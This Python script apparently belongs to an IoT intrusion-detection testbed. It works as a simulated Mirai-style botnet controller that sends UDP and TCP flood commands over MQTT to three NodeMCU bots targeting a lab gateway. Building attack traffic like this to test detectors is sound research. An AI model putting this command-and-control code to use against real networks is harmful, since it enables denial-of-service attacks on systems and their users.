#!/usr/bin/env python3
"""Command the NodeMCU 'bots' (simulated botnet, like Mirai C2) through the broker.
Usage: bot_master [command] [seconds]
Commands:
  udp_flood [seconds]   - all 3 NodeMCU bots flood the gateway with UDP packets (port 5683)
  tcp_flood [seconds]   - all 3 NodeMCU bots flood the gateway with TCP connections (port 1883)
  stop                  - stop attack and return all bots to normal sensor mode
"""
import json
import os
import sys
import time
import paho.mqtt.client as mqtt

BROKER = os.environ.get("TARGET", "172.30.0.10")
USER = os.environ.get("MQTT_USER", "tinyids")
PASS = os.environ.get("MQTT_PASS", "tinyids123")

command = sys.argv[1] if len(sys.argv) > 1 else "udp_flood"
seconds = int(sys.argv[2]) if len(sys.argv) > 2 else 10

client = mqtt.Client(client_id="bot-master-cli")
client.username_pw_set(USER, PASS)
client.on_message = lambda c, u, msg: print(f"  [bot update] {msg.topic}: {msg.payload.decode()}", flush=True)

try:
    client.connect(BROKER, 1883, keepalive=30)
except Exception as e:
    print(f"Failed to connect to broker {BROKER}: {e}")
    sys.exit(1)

client.subscribe("bot/#")
client.loop_start()

msg = json.dumps({"command": command, "seconds": seconds})
client.publish("cmd/bot", msg)
print(f"[*] Broadcast C2 command to all NodeMCU bots: {msg}")
print(f"[*] Bots will attack gateway for {seconds}s from IPs 172.30.0.21, .22, .23...")
time.sleep(seconds + 2 if command != "stop" else 2)
client.loop_stop()
client.disconnect()
print("[*] Done.")
